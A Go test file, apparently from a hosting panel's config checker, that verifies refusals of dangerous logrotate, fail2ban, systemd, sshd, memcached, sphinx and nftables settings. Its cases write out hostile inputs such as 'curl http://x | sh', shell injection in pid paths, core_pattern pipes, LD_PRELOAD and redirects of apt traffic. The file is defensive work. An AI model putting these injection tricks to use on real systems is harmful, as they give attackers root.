package confcheck

import (
	"os"
	"os/exec"
	"strings"
	"testing"
)

const (
	lr         = "/etc/logrotate.d/monopanel-sites"
	lrStanza   = "/var/log/monopanel/sites/alex/*.access.log {\n"
	lrNginxUSR = "\t\t[ ! -s /run/nginx.pid ] || kill -USR1 \"$(cat /run/nginx.pid)\" 2>/dev/null || true\n"
)

func TestLogrotateRefusals(t *testing.T) {
	runRefusals(t, []refusal{
		{"global option", lr, "compresscmd /tmp/evil\n" + lrStanza + "}\n", []string{"compresscmd", "outside a stanza"}},
		{"global include", lr, "include /var/lib/monopanel/lr\n", []string{"include"}},
		{"prerotate", lr, lrStanza + "\tprerotate\n\t\tid\n\tendscript\n}\n", []string{"prerotate"}},
		{"lastaction", lr, lrStanza + "\tlastaction\n\t\tid\n\tendscript\n}\n", []string{"lastaction"}},
		{"postrotate command", lr, lrStanza + "\tpostrotate\n" + lrNginxUSR + "\t\tcurl http://x | sh\n\tendscript\n}\n", []string{"curl", "line 4"}},
		{"postrotate other pid", lr, lrStanza + "\tpostrotate\n\t\t[ ! -s /tmp/x.pid ] || kill -USR1 \"$(cat /tmp/x.pid)\" 2>/dev/null || true\n\tendscript\n}\n", []string{"/tmp/x.pid"}},
		{"script never ends", lr, lrStanza + "\tpostrotate\n" + lrNginxUSR + "}\n", nil},
		{"su", lr, lrStanza + "\tsu root root\n}\n", []string{"su"}},
		{"olddir", lr, lrStanza + "\tolddir /etc/cron.d\n}\n", []string{"olddir"}},
		{"compresscmd in a stanza", lr, lrStanza + "\tcompresscmd /tmp/x\n}\n", []string{"compresscmd"}},
		{"mail", lr, lrStanza + "\tmail x@example.com\n}\n", []string{"mail"}},
		{"create setuid", lr, lrStanza + "\tcreate 4755 root alex\n}\n", []string{"create 4755"}},
		{"create world writable", lr, lrStanza + "\tcreate 0666 alex alex\n}\n", []string{"create 0666"}},
		{"create other group", lr, lrStanza + "\tcreate 0640 root shadow\n}\n", []string{"shadow"}},
		{"create other owner", lr, lrStanza + "\tcreate 0640 shop alex\n}\n", []string{"shop"}},
		{"shadow", lr, "/etc/shadow {\n\tcreate 0666 root root\n}\n", []string{"/etc/shadow"}},
		{"dotdot", lr, "/var/log/monopanel/sites/alex/../../../../etc/* {\n}\n", []string{"etc"}},
		{"panel dir", lr, "/var/log/monopanel/*.log {\n}\n", []string{"/var/log/monopanel/*.log"}},
		{"home", lr, "/var/www/alex/data/logs/*.log {\n}\n", []string{"/var/www/alex/data/logs/*.log"}},
		{"glob login", lr, "/var/log/monopanel/sites/*/x.log {\n}\n", []string{"sites/*"}},
		{"two accounts", lr, "/var/log/monopanel/sites/alex/*.log /var/log/monopanel/sites/shop/*.log {\n}\n", []string{"one account"}},
		{"dot files", lr, "/var/log/monopanel/sites/alex/.* {\n}\n", []string{".*"}},
		{"unclosed", lr, lrStanza + "\tweekly\n", nil},
		{"unknown option", lr, lrStanza + "\ttabooext + .x\n}\n", []string{"tabooext"}},
		// logrotate reads directives right after endscript: these two set a
		// compressor that is a shell fed with the log.
		{"directive after endscript", lr, lrStanza + "\tcompress\n\tpostrotate\n" + lrNginxUSR + "\tendscript compresscmd /bin/sh\n\tpostrotate\n" + lrNginxUSR + "\tendscript compressoptions -s\n}\n", []string{"compresscmd /bin/sh", "line 5"}},
		// U+00A0 is no blank to logrotate: the script goes on past it.
		{"no-break space before endscript", lr, lrStanza + "\tpostrotate\n" + lrNginxUSR + "\t endscript\n\tdaily\n\tendscript\n}\n", []string{"endscript"}},
		{"brace in a mask", lr, "/var/log/monopanel/sites/alex/{a,b}.log {\n}\n", []string{"braces"}},
		{"escaped mask", lr, "/var/log/monopanel/sites/alex/a\\ b.log {\n}\n", nil},
	})
}

const (
	jail   = "/etc/fail2ban/jail.d/monopanel.local"
	filter = "/etc/fail2ban/filter.d/monopanel.conf"
)

func TestFail2banRefusals(t *testing.T) {
	runRefusals(t, []refusal{
		{"action override", jail, "[sshd]\nenabled = true\naction = iptables[actionban=\"touch /tmp/x\"]\n", []string{"action"}},
		{"actionban", jail, "[sshd]\nactionban = touch /tmp/x\n", []string{"actionban"}},
		{"banaction parameters", jail, "[DEFAULT]\nbanaction = nftables-multiport[actionban=\"id\"]\n", []string{"banaction"}},
		{"unknown banaction", jail, "[DEFAULT]\nbanaction = evil\n", []string{"banaction"}},
		{"ignorecommand", jail, "[DEFAULT]\nignorecommand = /tmp/x <ip>\n", []string{"ignorecommand"}},
		{"bantime formula", jail, "[DEFAULT]\nbantime.formula = __import__('os').system('id')\n", []string{"bantime.formula"}},
		{"port injection", jail, "[monopanel]\nport = 8443; touch /tmp/x\n", []string{"port"}},
		{"interpolation", jail, "[DEFAULT]\nevil = 22; id\n[sshd]\nport = %(evil)s\n", []string{"evil"}},
		{"tag", jail, "[sshd]\nchain = <evil>\n", []string{"chain"}},
		{"includes", jail, "[INCLUDES]\nbefore = /tmp/x.conf\n", []string{"INCLUDES"}},
		{"logpath shadow", jail, "[sshd]\nlogpath = /etc/shadow\n", []string{"logpath"}},
		{"logpath continued", jail, "[sshd]\nlogpath = /var/log/nginx/error.log\n          /root/.bash_history\n", []string{"/root/.bash_history"}},
		{"continued key", jail, "[sshd]\nenabled = true\n  action = x\n", []string{"enabled"}},
		{"option outside", jail, "port = 22\n", nil},
		{"filter action", filter, "[Definition]\nfailregex = x\nactionban = touch /tmp/x\n", []string{"actionban"}},
		{"filter ignorecommand", filter, "[Definition]\nignorecommand = /tmp/x\n", []string{"ignorecommand"}},
		{"filter include path", filter, "[INCLUDES]\nbefore = ../../tmp/x.conf\n", []string{"before"}},
		{"filter section", filter, "[Action]\nactionban = x\n", []string{"[Action]"}},
		{"action file", "/etc/fail2ban/action.d/nftables.local", "[Definition]\nactionban = id\n", []string{"action.d"}},
		{"server config", "/etc/fail2ban/fail2ban.local", "[Definition]\nlogtarget = /etc/cron.d/x\n", []string{"fail2ban.local"}},
		// Python counts U+00A0 as indentation: the option above is indented
		// one deeper than this check counts, and ignorecommand stands alone
		// where it looks like a second ignoreip.
		{"no-break space indentation", jail, "[sshd]\n ignoreip = 127.0.0.1\n ignorecommand:/var/www/alex/evil\n", []string{"U+00A0"}},
		{"ideographic space", jail, "[sshd]\nenabled = true\n　action = x\n", []string{"U+3000"}},
		{"information separator", jail, "[sshd]\nenabled = true\n\x1caction = x\n", []string{"control character"}},
		{"not UTF-8", filter, "[Definition]\nfailregex = \xff\n", []string{"UTF-8"}},
		{"raw dns", jail, "[sshd]\nusedns = raw\n", []string{"usedns"}},
	})
	// Comments may say what they like, an em dash included.
	pass(t, jail, "# Generated by MonoPanel — jails\n[sshd]\nenabled = true\n")
}

func TestBootFilesRefusals(t *testing.T) {
	const tmp = "/etc/tmpfiles.d/monopanel-php.conf"
	const su = "/etc/sysusers.d/monopanel.conf"
	const sc = "/etc/sysctl.d/90-monopanel.conf"
	runRefusals(t, []refusal{
		{"tmpfiles link", tmp, "L /etc/cron.d/x - - - - /var/lib/monopanel/x\n", []string{"L /etc/cron.d/x"}},
		{"tmpfiles write", tmp, "w /proc/sys/kernel/core_pattern - - - - |/tmp/x\n", nil},
		{"tmpfiles file", tmp, "f /etc/ld.so.preload 0644 root root - /tmp/x.so\n", nil},
		{"tmpfiles chown", tmp, "Z /etc 0777 monopanel monopanel -\n", nil},
		{"tmpfiles outside run", tmp, "d /etc/cron.d 0777 root root -\n", []string{"/etc/cron.d"}},
		{"tmpfiles dotdot", tmp, "d /run/monopanel/../../etc/x 0755 root root -\n", nil},
		{"tmpfiles specifier", tmp, "d /run/monopanel/%u 0755 root root -\n", nil},
		{"tmpfiles escape", tmp, "d /run/monopanel/\\x2e\\x2e/\\x2e\\x2e/etc 0777 root root -\n", nil},
		{"tmpfiles quoted", tmp, "d \"/run/monopanel/a b\" 0755 root root -\n", nil},
		{"tmpfiles setuid mode", tmp, "d /run/monopanel/php 4755 root root -\n", []string{"special bits"}},
		{"tmpfiles API owner", tmp, "d /run/monopanel/php 0755 monopanel monopanel -\n", []string{"root's"}},
		{"tmpfiles age", tmp, "d /run/monopanel/php 0755 root root 10d\n", []string{"age"}},
		// Others could put a symlink where the root master makes its socket.
		{"tmpfiles world-writable", tmp, "d /run/monopanel/php 0777 root root -\n", []string{"only root writes"}},
		{"tmpfiles group-writable", tmp, "d /run/monopanel/php 0775 root root -\n", []string{"only root writes"}},
		{"tmpfiles boot modifier", tmp, "d! /run/monopanel/php 0755 root root -\n", nil},
		{"sysusers root id", su, "u monopanel 0 \"x\" /var/lib/monopanel /usr/sbin/nologin\n", []string{"systemd's choice"}},
		{"sysusers other name", su, "u evil - \"x\" /root /bin/bash\n", []string{"own accounts"}},
		{"sysusers sudo", su, "m monopanel sudo\n", []string{"m monopanel sudo"}},
		{"sysusers member", su, "m ubuntu monopanel\n", nil},
		{"sysusers shell", su, "u monopanel - \"x\" /var/lib/monopanel /bin/bash\n", []string{"login shell"}},
		{"sysusers home", su, "u monopanel - \"x\" /root /usr/sbin/nologin\n", []string{"/var/lib"}},
		{"sysusers range", su, "r - 500-900\n", nil},
		{"core pattern", sc, "kernel.core_pattern = |/tmp/x\n", []string{"kernel.core_pattern"}},
		{"modprobe", sc, "kernel.modprobe = /tmp/x\n", []string{"kernel.modprobe"}},
		{"slashes", sc, "kernel/core_pattern = |/tmp/x\n", nil},
		{"ignored errors", sc, "-kernel.core_pattern = |/tmp/x\n", nil},
		{"bad value", sc, "net.ipv6.ip_nonlocal_bind = 2\n", nil},
		{"sysctl.conf", "/etc/sysctl.conf", "kernel.core_pattern=|/tmp/x\n", nil},
	})
}

func TestSSHRefusals(t *testing.T) {
	const p = "/etc/ssh/sshd_config.d/monopanel.conf"
	runRefusals(t, []refusal{
		{"root login", p, "PermitRootLogin yes\n", []string{"PermitRootLogin"}},
		{"authorized keys", p, "AuthorizedKeysFile /var/lib/monopanel/keys/%u\n", []string{"AuthorizedKeysFile"}},
		{"keys command", p, "AuthorizedKeysCommand /tmp/x\nAuthorizedKeysCommandUser root\n", []string{"AuthorizedKeysCommand"}},
		{"user CA", p, "TrustedUserCAKeys /var/lib/monopanel/ca.pub\n", []string{"TrustedUserCAKeys"}},
		{"principals", p, "AuthorizedPrincipalsCommand /tmp/x\n", []string{"AuthorizedPrincipalsCommand"}},
		{"include", p, "Include /var/lib/monopanel/sshd.conf\n", []string{"Include"}},
		{"banner", p, "Banner /etc/shadow\n", []string{"Banner"}},
		{"user environment", p, "PermitUserEnvironment yes\n", []string{"PermitUserEnvironment"}},
		{"subsystem", p, "Subsystem sftp /tmp/x\n", []string{"Subsystem"}},
		{"empty passwords", p, "PermitEmptyPasswords yes\n", []string{"PermitEmptyPasswords"}},
		{"force a shell", p, "Match Group monopanel-sftp\n    ForceCommand /bin/sh -c id\n", []string{"ForceCommand"}},
		{"force more", p, "Match Group monopanel-sftp\n    ForceCommand internal-sftp; id\n", []string{"ForceCommand"}},
		{"chroot root", p, "Match Group monopanel-sftp\n    ChrootDirectory /\n", []string{"ChrootDirectory"}},
		{"match address", p, "Match Address 0.0.0.0/0\n    PasswordAuthentication yes\n", []string{"Match"}},
		{"match all", p, "Match all\n", []string{"Match"}},
		{"equals form", p, "PermitRootLogin=yes\n", []string{"PermitRootLogin"}},
		{"client config", "/etc/ssh/ssh_config.d/x.conf", "ProxyCommand /tmp/x\n", []string{"ssh_config.d"}},
		{"host key", "/etc/ssh/ssh_host_ed25519_key", "x\n", nil},
		{"not .conf", "/etc/ssh/sshd_config.d/monopanel", "PasswordAuthentication yes\n", nil},
	})
}

func TestServiceRefusals(t *testing.T) {
	const mc = "/etc/memcached.conf"
	const sys = "/etc/sysconfig/memcached"
	const sx = "/etc/sphinxsearch/sphinx.conf"
	const sel = "/etc/selinux/config"
	const nft = "/etc/nftables.d/monopanel.nft"
	runRefusals(t, []refusal{
		{"memcached root", mc, "-m 64\n-u root\n", []string{"-u root"}},
		{"memcached logfile", mc, "logfile /etc/cron.d/memcached\n", []string{"logfile"}},
		{"memcached file", mc, "-e /var/lib/monopanel/mem\n", []string{"-e"}},
		{"memcached extstore", mc, "-o ext_path=/tmp/x:1G\n", []string{"-o"}},
		{"memcached pid", mc, "-P /etc/passwd\n", []string{"-P"}},
		// Debian's wrapper runs exec "memcached $params": one string, so the
		// shell reads the options.
		{"memcached shell in the pid path", mc, "-m 64\n-u memcache\n-P /run/memcached/m;id>/tmp/pwned\n", []string{"-P", "shell"}},
		{"memcached substitution in the pid path", mc, "-P /run/memcached/$(id).pid\n", []string{"-P"}},
		{"memcached shell in the log path", mc, "logfile /var/log/memcached.log;id\n", []string{"logfile"}},
		{"sphinx key after a brace", sx, "index x { path = /etc/x\n}\n", []string{"path"}},
		{"sphinx command after a brace", sx, "source x {xmlpipe_command = /bin/sh -c id\n}\n", []string{"xmlpipe_command"}},
		{"sysconfig user", sys, "USER=\"root\"\n", []string{"USER=root"}},
		{"sysconfig preload", sys, "LD_PRELOAD=\"/tmp/x.so\"\n", []string{"LD_PRELOAD"}},
		{"sysconfig options user", sys, "OPTIONS=\"-l 127.0.0.1 -u root\"\n", []string{"-u root"}},
		{"sysconfig substitution", sys, "OPTIONS=\"$(id)\"\n", nil},
		{"sphinx shebang", sx, "#!/bin/sh\necho 'searchd {}'\n", []string{"#!"}},
		{"sphinx pipe", sx, "source x\n{\n    type = xmlpipe2\n    xmlpipe_command = /bin/sh -c id\n}\n", []string{"xmlpipe_command"}},
		{"sphinx tsv", sx, "source x {\n    tsvpipe_command = id\n}\n", []string{"tsvpipe_command"}},
		{"sphinx continued", sx, "source x {\n    xmlpipe_com\\\nmand = id\n}\n", []string{"continued"}},
		{"sphinx continued comment", sx, "searchd {\n    read_timeout = 5 # \\\n    xmlpipe_command = id\n}\n", nil},
		{"sphinx plugins", sx, "common {\n    plugin_dir = /tmp\n}\n", []string{"plugin_dir"}},
		{"sphinx log", sx, "searchd {\n    log = /etc/cron.d/x\n}\n", []string{"log"}},
		{"sphinx pid", sx, "searchd {\n    pid_file = /var/lib/monopanel/x.pid\n}\n", []string{"pid_file"}},
		{"sphinx index path", sx, "index x {\n    path = /etc/x\n}\n", []string{"path"}},
		{"sphinx defaults", sphinxDefaults, "START=yes\nDAEMON_OPTS=\"--config /tmp/x\"\n", []string{"DAEMON_OPTS"}},
		{"sphinx defaults command", sphinxDefaults, "START=yes; touch /tmp/x\n", nil},
		{"selinux disabled", sel, "SELINUX=disabled\n", []string{"SELINUX=disabled"}},
		{"selinux type", sel, "SELINUXTYPE=evil\n", []string{"SELINUXTYPE=evil"}},
		{"selinux other", sel, "SELINUX=permissive\nAUTORELABEL=1\n", []string{"AUTORELABEL"}},
		{"selinux policy file", "/etc/selinux/targeted/contexts/files/file_contexts.local", "/etc(/.*)? unconfined_t\n", nil},
		{"nft include", nft, "include \"/etc/shadow\"\n", []string{"include"}},
		// apt fetches nginx.org and repo.mysql.com over plain http, signed by
		// a keyring the API writes: a redirect of the host's own connections
		// would serve it packages of the API's.
		{"nft redirect of apt", nft, "table ip x {\n  chain out {\n    type nat hook output priority -100;\n    ip daddr 52.58.199.22 tcp dport 80 dnat to 127.0.0.1:18080\n  }\n}\n", []string{"nat", "line 3"}},
		{"nft redirect statement", nft, "add rule ip x y tcp dport 80 redirect to :18080\n", []string{"redirect"}},
		{"nft route chain", nft, "table ip x { chain y { type route hook output priority 0; meta mark set 1; } }\n", []string{"route"}},
		{"nft tproxy", nft, "table ip x { chain y { type filter hook prerouting priority 0; tcp dport 80 tproxy to :1; } }\n", []string{"prerouting"}},
		{"nft netdev forward", nft, "table netdev x { chain y { type filter hook ingress device eth0 priority 0; fwd to lo; } }\n", []string{"ingress"}},
		{"nft include in a block", nft, "table inet x { include \"/var/lib/monopanel/x.nft\" }\n", []string{"include"}},
	})
	// Whether a string or a comment hides what follows is nft's business:
	// the word is refused wherever it stands.
	refuse(t, nft, "add rule inet x y comment \"a\\\" include \"/etc/shadow\"\n", "include")
	refuse(t, nft, "add rule inet x y comment \"#\"; include \"/etc/shadow\"\n", "include")
	pass(t, nft, "table inet monopanel { chain input { tcp dport 22 accept; } }\n")
}

// The composer wrapper's guard fails closed: it lets the wrapper go on for
// a uid other than 0 and for nothing else — not for root, and not when id
// prints nothing (missing, broken, not on root's PATH), which the string
// test it had first took for "not root". Each POSIX shell at hand runs it,
// id replaced by what it would print.
func TestComposerRootGuardFailsClosed(t *testing.T) {
	const id = "/usr/bin/id -u"
	if strings.Count(ComposerRootGuard, id) != 1 {
		t.Fatalf("the guard does not ask %s once: %s", id, ComposerRootGuard)
	}
	var shells [][]string
	for _, sh := range [][]string{{"/bin/sh"}, {"/usr/bin/dash"}, {"/bin/dash"}, {"/usr/bin/bash", "--posix"}, {"/bin/busybox", "sh"}, {"/usr/bin/busybox", "sh"}} {
		if _, err := os.Stat(sh[0]); err == nil {
			shells = append(shells, sh)
		}
	}
	if len(shells) == 0 {
		t.Skip("no POSIX shell on this host")
	}
	run := func(sh []string, guard string) (string, bool) {
		cmd := exec.Command(sh[0], append(sh[1:], "-c", guard+"\necho went-on")...)
		out, err := cmd.CombinedOutput()
		return string(out), err == nil && strings.Contains(string(out), "went-on")
	}
	for _, sh := range shells {
		for _, c := range []struct {
			what, id string
			goesOn   bool
		}{
			{"an account", "echo 1000", true},
			{"root", "echo 0", false},
			{"id missing", "/nonexistent/id -u", false},
			{"id printing nothing", "printf ''", false},
			{"id failing", "false", false},
			{"id printing words", "echo root", false},
		} {
			out, goesOn := run(sh, strings.Replace(ComposerRootGuard, id, c.id, 1))
			if goesOn != c.goesOn {
				t.Errorf("%s, %s: went on %v, want %v:\n%s", strings.Join(sh, " "), c.what, goesOn, c.goesOn, out)
			}
			if !goesOn && !strings.Contains(out, "not as root") {
				t.Errorf("%s, %s: the refusal says nothing:\n%s", strings.Join(sh, " "), c.what, out)
			}
		}
		// The guard it replaced let a missing id through.
		if _, goesOn := run(sh, `[ "$(/nonexistent/id -u)" != 0 ] || { echo "not as root" >&2; exit 1; }`); !goesOn {
			t.Errorf("%s: the string test refused a missing id after all, unlike what the comment of ComposerRootGuard says", strings.Join(sh, " "))
		}
	}
}
